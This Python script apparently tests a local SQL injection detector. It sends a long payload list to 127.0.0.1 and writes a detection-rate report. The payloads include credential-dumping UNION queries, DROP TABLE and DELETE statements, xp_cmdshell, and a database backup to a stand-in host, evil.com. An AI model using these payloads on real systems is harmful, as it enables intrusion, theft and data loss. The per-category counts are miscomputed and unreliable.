#!/usr/bin/env python3
import requests
import time
import json
from datetime import datetime
import random
import urllib.parse

class SQLInjectionTester:
    def __init__(self, target_url="http://127.0.0.1:5000"):
        self.target_url = target_url
        self.test_patterns = [
            # Basic SQL Injection
            "' OR '1'='1",
            "1' OR '1' = '1",
            "1 OR 1=1",
            "' OR 1=1 --",
            "' OR 'a'='a",
            "') OR ('1'='1",
            "1' OR '1'='1' --",
            
            # UNION-based
            "' UNION SELECT username, password FROM users--",
            "' UNION ALL SELECT NULL,NULL,NULL--",
            "' UNION SELECT @@version --",
            "' UNION SELECT table_name,NULL FROM information_schema.tables--",
            "' UNION SELECT NULL,NULL,NULL,NULL--",
            "' UNION SELECT username,password FROM users WHERE 't'='t",
            "' UNION SELECT creditcard,NULL FROM users--",
            
            # Error-based
            "' AND 1=CONVERT(int,(SELECT @@VERSION))--",
            "' AND 1=db_name()--",
            "' AND 1=user_name()--",
            "' having 1=1--",
            "' group by users.id having 1=1--",
            "' SELECT name FROM syscolumns WHERE id = (SELECT id FROM sysobjects WHERE name = 'users')--",
            
            # Time-based
            "'; WAITFOR DELAY '0:0:5'--",
            "'; SLEEP(5)--",
            "' BENCHMARK(5000000,MD5(1))--",
            "') OR SLEEP(5)--",
            "' OR (SELECT * FROM (SELECT(SLEEP(5)))a)--",
            
            # Stacked queries
            "'; DROP TABLE users--",
            "'; DELETE FROM users--",
            "'; UPDATE users SET password='hacked'--",
            "'; TRUNCATE TABLE logs--",
            "'; INSERT INTO users VALUES ('hacker','password')--",
            
            # Advanced patterns
            "' OR 'x'='x' /*",
            "admin'--",
            "1' OR '1'='1' #",
            "' OR 1=1 LIMIT 1--",
            "' OR '1'='1' LIMIT 1--",
            
            # Encoded patterns
            "%27%20OR%20%271%27=%271",
            "1%27%20OR%20%271%27%20=%20%271",
            "%27+OR+%271%27=%271",
            "%27%20or%201=1",
            "admin%27%20or%20%271%27=%271",
            
            # Boolean-based
            "' OR 1=1 AND '1'='1",
            "' OR 'true'='true",
            "' OR 1 LIKE 1",
            "' OR 1 IN (1)",
            "' OR 1 BETWEEN 1 AND 1",
            
            # Column enumeration
            "' ORDER BY 1--",
            "' ORDER BY 2--",
            "' ORDER BY 3--",
            "' GROUP BY 1--",
            "' GROUP BY 2--",
            
            # Database specific
            "' OR sqlite_version()>0--",
            "' OR pg_sleep(5)--",
            "' OR UTL_INADDR.get_host_name('evil.com')--",
            "' OR LENGTH(DATABASE())>0--",
            
            # Blind SQL injection
            "' OR (SELECT ASCII(SUBSTRING(username,1,1)) FROM users LIMIT 1)>90--",
            "' OR (SELECT COUNT(*) FROM users)>0--",
            "' OR EXISTS(SELECT * FROM users)--",
            "' OR SUBSTRING(version(),1,1)='5'--",
            
            # Mixed case and spaces
            "' oR '1'='1",
            "'/**/OR/**/1=1",
            "'%20OR%20'1'%3D'1",
            "' Or 1=1--",
            "'+or+'1'='1",
            
            # Complex conditions
            "' OR 1=1 AND SLEEP(5)--",
            "' OR 1=1 ORDER BY 1--",
            "' OR 1=1 UNION SELECT NULL--",
            "' OR 1=1 GROUP BY 1--",
            "' OR 1=1 HAVING 1=1--",
            
            # Function-based
            "' OR LENGTH(USER)>0--",
            "' OR CHAR(65)='A'",
            "' OR ASCII('A')=65--",
            "' OR UNICODE('A')=65--",
            "' OR SUBSTR(USER,1,1)='A'--",
            
            # Special characters
            "'; exec xp_cmdshell('dir')--",
            "'; exec sp_makewebtask 'c:\inetpub\wwwroot\test.html'--",
            "'; backup database master to disk='\\evil.com\backup.dat'--",
            "'; declare @q varchar(8000) select @q = 0x73656c65637420404076657273696f6e--",
            
            # Case variations
            "' or '1'='1' /*",
            "' OR '1'='1' --+",
            "' oR '1'='1' #",
            "' Or '1'='1' ;--",
            "' or '1'='1' %00",
            
            # Different quotes
            "\" OR \"1\"=\"1",
            "' OR \"1\"=\"1",
            "\" OR '1'='1",
            "`OR`1`=`1",
            "' OR '1'='1' AND '2'>'1",
            
            # System tables
            "' UNION SELECT * FROM sys.tables--",
            "' UNION SELECT * FROM information_schema.tables--",
            "' UNION SELECT * FROM mysql.user--",
            "' UNION SELECT * FROM pg_catalog.pg_tables--",
            "' UNION SELECT * FROM sqlite_master--",
            
            # Different operators
            "' OR 1 REGEXP 1--",
            "' OR 1 SOUNDS LIKE 1--",
            "' OR 1 RLIKE 1--",
            "' OR 1 GLOB 1--",
            "' OR 1 MATCH 1--",
            
            # Conditional structures
            "' OR IF(1=1,1,0)=1--",
            "' OR CASE WHEN 1=1 THEN 1 ELSE 0 END=1--",
            "' OR COALESCE(1,0)=1--",
            "' OR IIF(1=1,1,0)=1--",
            
            # Different encodings
            "' OR '¹'='¹",
            "' OR 'Ã'='Ã",
            "' OR '１'='１",
            "' OR '🔥'='🔥",
            
            # Nested queries
            "' OR (SELECT 1)=1--",
            "' OR EXISTS(SELECT 1)--",
            "' OR 1=(SELECT 1)--",
            "' OR 1 IN (SELECT 1)--",
            
            # Different line endings
            "' OR '1'='1'\n--",
            "' OR '1'='1'\r\n--",
            "' OR '1'='1'\r--",
            "' OR '1'='1'\f--",
            
            # Mixed techniques
            "' OR 1=1 UNION SELECT @@version--",
            "' OR EXISTS(SELECT * FROM users) AND SLEEP(1)--",
            "' OR 1=1 ORDER BY (SELECT table_name FROM information_schema.tables LIMIT 1)--",
            "' OR 1=1 GROUP BY CONCAT(version(),0x3a,user())--",
            "' OR 1=1 HAVING CONCAT(version(),0x3a,user())>0--"
        ]

    def generate_request_data(self, pattern):
        methods = ['GET', 'POST']
        paths = ['/login', '/search', '/query', '/users', '/admin', '/dashboard', '/profile', '/settings']
        
        return {
            'method': random.choice(methods),
            'path': random.choice(paths),
            'args': json.dumps({'q': pattern}),
            'hour': datetime.now().hour,
            'day': datetime.now().weekday()
        }

    def test_pattern(self, pattern):
        data = self.generate_request_data(pattern)
        try:
            response = requests.post(self.target_url, data=data)
            return {
                'pattern': pattern,
                'status_code': response.status_code,
                'response': response.text,
                'detected': response.text.strip() == '1'
            }
        except Exception as e:
            return {
                'pattern': pattern,
                'error': str(e),
                'detected': None
            }

    def run_tests(self):
        results = []
        print(f"Starting SQL Injection tests against {self.target_url}")
        print("-" * 50)
        print(f"Total patterns to test: {len(self.test_patterns)}")
        
        for i, pattern in enumerate(self.test_patterns, 1):
            print(f"Testing pattern [{i}/{len(self.test_patterns)}]: {pattern[:50]}...")
            result = self.test_pattern(pattern)
            results.append(result)
            # Add delay to prevent overwhelming the server
            time.sleep(0.5)

        return results

    def generate_report(self, results):
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        report_file = f"attack_test_report_{timestamp}.txt"
        
        with open(report_file, 'w') as f:
            f.write("SQL Injection Detection Test Report\n")
            f.write("=" * 50 + "\n")
            f.write(f"Test Time: {datetime.now()}\n")
            f.write(f"Target URL: {self.target_url}\n")
            f.write("-" * 50 + "\n\n")

            detected_count = sum(1 for r in results if r.get('detected'))
            total_tests = len(results)
            
            f.write(f"Summary:\n")
            f.write(f"Total Tests: {total_tests}\n")
            f.write(f"Attacks Detected: {detected_count}\n")
            f.write(f"Detection Rate: {(detected_count/total_tests)*100:.2f}%\n\n")
            
            # Categories summary
            categories = {
                'Basic': sum(1 for r in results[:7] if r.get('detected')),
                'UNION': sum(1 for r in results[7:14] if r.get('detected')),
                'Error': sum(1 for r in results[14:20] if r.get('detected')),
                'Time': sum(1 for r in results[20:25] if r.get('detected')),
                'Stacked': sum(1 for r in results[25:30] if r.get('detected')),
                'Advanced': sum(1 for r in results[30:35] if r.get('detected')),
                'Encoded': sum(1 for r in results[35:40] if r.get('detected')),
                'Boolean': sum(1 for r in results[40:45] if r.get('detected')),
                'Column': sum(1 for r in results[45:50] if r.get('detected')),
                'Database': sum(1 for r in results[50:54] if r.get('detected')),
            }
            
            f.write("Detection by Category:\n")
            for category, count in categories.items():
                total = 5 if category != 'Database' else 4
                f.write(f"{category}: {count}/{total} ({count/total*100:.2f}%)\n")
            f.write("\n")
            
            f.write("Detailed Results:\n")
            f.write("-" * 50 + "\n")
            
            for result in results:
                f.write(f"\nPattern: {result['pattern']}\n")
                if 'error' in result:
                    f.write(f"Error: {result['error']}\n")
                else:
                    f.write(f"Status Code: {result['status_code']}\n")
                    f.write(f"Detected: {result['detected']}\n")
                f.write("-" * 30 + "\n")

        print(f"\nReport generated: {report_file}")
        return report_file

if __name__ == "__main__":
    tester = SQLInjectionTester()
    results = tester.run_tests()
    tester.generate_report(results)
